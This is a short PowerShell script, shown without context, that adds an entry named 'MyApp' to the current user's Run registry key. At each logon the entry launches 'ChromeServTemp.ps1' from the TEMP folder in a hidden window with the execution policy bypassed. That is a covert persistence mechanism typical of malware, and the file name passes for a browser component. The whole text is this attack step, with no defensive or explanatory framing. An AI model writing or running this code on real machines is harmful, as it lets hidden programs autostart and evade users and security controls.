$appName = "MyApp"
$appPath = Join-Path -Path $env:TEMP -ChildPath "ChromeServTemp.ps1"
$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$command = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$appPath`""
Set-ItemProperty -Path $regPath -Name $appName -Value $command
